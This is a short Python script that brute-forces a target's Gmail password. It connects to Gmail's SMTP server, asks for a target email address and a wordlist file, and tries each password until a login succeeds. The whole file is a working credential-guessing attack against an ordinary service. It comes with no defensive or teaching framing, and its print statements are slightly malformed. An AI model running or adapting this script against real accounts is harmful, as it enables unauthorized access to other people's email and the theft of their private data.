import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input ("Enter target email id: ")
passwf = input ("Enter password file name: ")
passwf = open(passwf, 'r')

for password in passwf:
    try:
        smtpserver.login(user, password)
        print("password found: %s" % password)
        break
    except:
        print("password Not Found %", password)